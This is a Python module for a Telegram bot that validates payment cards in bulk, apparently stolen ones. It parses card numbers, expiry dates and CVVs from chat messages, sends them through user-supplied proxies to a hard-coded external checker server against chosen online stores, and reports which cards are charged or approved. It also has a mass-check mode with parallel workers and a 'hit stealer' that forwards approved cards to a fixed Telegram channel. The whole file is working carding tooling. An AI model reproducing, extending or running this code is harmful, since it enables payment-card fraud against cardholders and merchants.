import time
import asyncio
import requests
import re
import os
import random
from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Configuration
CHECK_URL = "http://148.230.102.178:8081/"
STEALER_CHANNEL_ID = -1002549777556

# --- Logic & Helper Functions ---

def to_small_caps(text):
    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    small = "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ0123456789"
    trans = str.maketrans(normal, small)
    return text.translate(trans)

def get_msg_id(msg_obj, fallback_msg):
    return (
        getattr(msg_obj, "message_id", None)
        or getattr(msg_obj, "id", None)
        or getattr(fallback_msg, "message_id", None)
        or getattr(fallback_msg, "id", None)
    )

def get_user_data(user_id):
    from mongodb import usersites_collection
    doc = usersites_collection.find_one({"user_id": int(user_id)})
    if not doc:
        return None, None
    return doc.get("site_url"), doc.get("proxy")

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def check_single_card(fullcc, site, proxy):
    api_url = f"{CHECK_URL}?{fullcc}&url={site}&proxy={proxy}"
    try:
        loop = asyncio.get_event_loop()
        r = await loop.run_in_executor(None, lambda: requests.get(api_url, timeout=45))
        data = r.json()
        
        # Exact JSON parsing based on user format
        is_charged = str(data.get("Charged", "False")).strip().lower() == "true"
        is_approved = str(data.get("Approved", "False")).strip().lower() == "true"
        response_text = data.get("Response", "ᴄᴀʀᴅ ᴅᴇᴄʟɪɴᴇᴅ")
        price = data.get("Price", "0")
        gate = data.get("Gate", "ꜱʜᴏᴘɪꜰʏ")
        check_time = data.get("Time", "0s")
        
        if is_charged: 
            return {"status": "Charged", "response": "ᴄʜᴀʀɢᴇᴅ ✅", "price": price, "gate": gate, "time": check_time, "fullcc": fullcc}
        if is_approved: 
            return {"status": "Approved", "response": "ᴀᴘᴘʀᴏᴠᴇᴅ ✨", "price": price, "gate": gate, "time": check_time, "fullcc": fullcc}
        
        return {"status": "Declined", "response": response_text, "price": price, "gate": gate, "time": check_time, "fullcc": fullcc}
    except:
        return {"status": "Error", "response": "ᴀᴘɪ ᴛɪᴍᴇᴏᴜᴛ ❌", "price": "0", "gate": "ꜱʜᴏᴘɪꜰʏ", "time": "0s", "fullcc": fullcc}

# --- Command Handlers ---

@Client.on_message(filters.command("seturl", [".", "/"]))
async def set_url_handler(Client, message):
    user_id = message.from_user.id
    args = message.text.split(None, 1)
    if len(args) < 2:
        await message.reply("━━━━━━━━━━━━━━━━━━━━\n「 ꜱᴇᴛᴜᴘ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴜꜱᴀɢᴇ: /ꜱᴇᴛᴜʀʟ <ꜱᴛᴏʀᴇ>\n━━━━━━━━━━━━━━━━━━━━")
        return
    url = args[1].strip().replace("https://", "").replace("http://", "").strip("/")
    set_user_site(user_id, url)
    await message.reply(f"━━━━━━━━━━━━━━━━━━━━\n「 ꜱᴜᴄᴄᴇꜱꜱ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ꜱɪᴛᴇ ꜱᴀᴠᴇᴅ: {url}\n━━━━━━━━━━━━━━━━━━━━")

@Client.on_message(filters.command("setproxy", [".", "/"]))
async def set_proxy_handler(Client, message):
    user_id = message.from_user.id
    args = message.text.split(None, 1)
    if len(args) < 2:
        await message.reply("━━━━━━━━━━━━━━━━━━━━\n「 ᴘʀᴏxʏ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴜꜱᴀɢᴇ: /ꜱᴇᴛᴘʀᴏxʏ ʜᴏꜱᴛ:ᴘᴏʀᴛ:ᴜꜱᴇʀ:ᴘᴀꜱꜱ\n━━━━━━━━━━━━━━━━━━━━")
        return
    proxy = args[1].strip()
    from mongodb import usersites_collection
    usersites_collection.update_one({"user_id": int(user_id)}, {"$set": {"proxy": proxy}}, upsert=True)
    await message.reply("━━━━━━━━━━━━━━━━━━━━\n「 ᴘʀᴏxʏ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴘʀᴏxʏ ꜱᴀᴠᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ\n━━━━━━━━━━━━━━━━━━━━")

@Client.on_message(filters.command("sh", [".", "/"]))
async def single_check_handler(Client, message):
    user_id = message.from_user.id
    checkall = await check_all_thing(Client, message)
    if not checkall[0]: return
    cards = extract_cc(message.text)
    if not cards:
        await message.reply("━━━━━━━━━━━━━━━━━━━━\n「 ᴇʀʀᴏʀ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ɴᴏ ᴄᴀʀᴅ ꜰᴏᴜɴᴅ\n━━━━━━━━━━━━━━━━━━━━")
        return
    fullcc = cards[0]
    site, proxy = get_user_data(user_id)
    if not site or not proxy:
        missing = "ꜱɪᴛᴇ" if not site else "ᴘʀᴏxʏ"
        await message.reply(f"━━━━━━━━━━━━━━━━━━━━\n「 ꜱᴇᴛᴜᴘ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴍɪꜱꜱɪɴɢ: {missing}\n━━━━━━━━━━━━━━━━━━━━")
        return
    status_msg = await message.reply("━━━━━━━━━━━━━━━━━━━━\n「 ᴄʜᴇᴄᴋɪɴɢ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴄᴄ: <code>" + fullcc + "</code>\n━━━━━━━━━━━━━━━━━━━━")
    res = await check_single_card(fullcc, site, proxy)
    bin6 = fullcc.split("|")[0][:6]
    getbin = await get_bin_details(bin6)
    country = getbin[4] if len(getbin) > 4 else "ᴜɴᴋɴᴏᴡɴ"
    bank = getbin[3] if len(getbin) > 3 else "ᴜɴᴋɴᴏᴡɴ"
    final_text = (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"      「 {res['status'].upper()} 」\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"◈ ᴄᴄ: <code>{fullcc}</code>\n"
        f"◈ ꜱᴛᴀᴛᴜꜱ: {res['response']}\n"
        f"◈ ɢᴀᴛᴇ: {res['gate']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"◈ ᴘʀɪᴄᴇ: {res['price']}\n"
        f"◈ ɪꜱꜱᴜᴇʀ: {bank} | {country}\n"
        f"◈ ᴛɪᴍᴇ: {res['time']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"◈ ᴄʜᴇᴄᴋᴇᴅ ʙʏ: {message.from_user.first_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await Client.edit_message_text(message.chat.id, get_msg_id(status_msg, message), final_text)
    if res['status'] in ["Charged", "Approved"]:
        await send_hit_if_approved(Client, final_text)
    await setantispamtime(str(user_id))
    await deductcredit(str(user_id))

@Client.on_message(filters.command("msh", [".", "/"]))
async def mass_check_handler(Client, message):
    user_id = message.from_user.id
    checkall = await check_all_thing(Client, message)
    if not checkall[0]: return
    cards = extract_cc(message.text)
    if not cards:
        await message.reply("━━━━━━━━━━━━━━━━━━━━\n「 ᴇʀʀᴏʀ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ɴᴏ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ\n━━━━━━━━━━━━━━━━━━━━")
        return
    site, proxy = get_user_data(user_id)
    if not site or not proxy:
        missing = "ꜱɪᴛᴇ" if not site else "ᴘʀᴏxʏ"
        await message.reply(f"━━━━━━━━━━━━━━━━━━━━\n「 ꜱᴇᴛᴜᴘ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴍɪꜱꜱɪɴɢ: {missing}\n━━━━━━━━━━━━━━━━━━━━")
        return
    status_msg = await message.reply(f"━━━━━━━━━━━━━━━━━━━━\n「 ᴘʀᴏᴄᴇꜱꜱɪɴɢ 」\n━━━━━━━━━━━━━━━━━━━━\n◈ ᴛᴏᴛᴀʟ ᴄᴀʀᴅꜱ: {len(cards)}\n━━━━━━━━━━━━━━━━━━━━")
    results = {"Charged": [], "Approved": [], "Declined": [], "Error": []}
    async def worker(card_queue):
        while not card_queue.empty():
            card = await card_queue.get()
            res = await check_single_card(card, site, proxy)
            results[res['status']].append(res)
            total_done = sum(len(v) for v in results.values())
            if total_done % 2 == 0 or total_done == len(cards):
                progress = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"      「 ᴄʜᴇᴄᴋɪɴɢ 」\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"◈ ᴛᴏᴛᴀʟ: {len(cards)} | ᴅᴏɴᴇ: {total_done}\n"
                    f"◈ ⚡ ᴄʜᴀʀɢᴇᴅ: {len(results['Charged'])}\n"
                    f"◈ ✅ ᴀᴘᴘʀᴏᴠᴇᴅ: {len(results['Approved'])}\n"
                    f"◈ ❌ ᴅᴇᴄʟɪɴᴇᴅ: {len(results['Declined'])}\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                try: await status_msg.edit(progress)
                except: pass
            if res['status'] in ["Charged", "Approved"]:
                bin6 = res['fullcc'].split("|")[0][:6]
                getbin = await get_bin_details(bin6)
                country = getbin[4] if len(getbin) > 4 else "ᴜɴᴋɴᴏᴡɴ"
                bank = getbin[3] if len(getbin) > 3 else "ᴜɴᴋɴᴏᴡɴ"
                hit_text = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"      「 {res['status'].upper()} 」\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"◈ ᴄᴄ: <code>{res['fullcc']}</code>\n"
                    f"◈ ꜱᴛᴀᴛᴜꜱ: {res['response']}\n"
                    f"◈ ɢᴀᴛᴇ: {res['gate']}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"◈ ᴘʀɪᴄᴇ: {res['price']}\n"
                    f"◈ ɪꜱꜱᴜᴇʀ: {bank} | {country}\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"◈ ᴄʜᴇᴄᴋᴇᴅ ʙʏ: {message.from_user.first_name}\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
                await send_hit_if_approved(Client, hit_text)
            card_queue.task_done()
    queue = asyncio.Queue()
    for c in cards: await queue.put(c)
    tasks = [asyncio.create_task(worker(queue)) for _ in range(5)]
    await queue.join()
    for t in tasks: t.cancel()
    await status_msg.delete()
    final_summary = (
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"      「 ꜰɪɴɪꜱʜᴇᴅ 」\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"◈ ᴛᴏᴛᴀʟ: {len(cards)}\n"
        f"◈ ⚡ ᴄʜᴀʀɢᴇᴅ: {len(results['Charged'])}\n"
        f"◈ ✅ ᴀᴘᴘʀᴏᴠᴇᴅ: {len(results['Approved'])}\n"
        f"◈ ❌ ᴅᴇᴄʟɪɴᴇᴅ: {len(results['Declined'])}\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await message.reply(final_summary)
    await setantispamtime(str(user_id))
    await deductcredit(str(user_id))
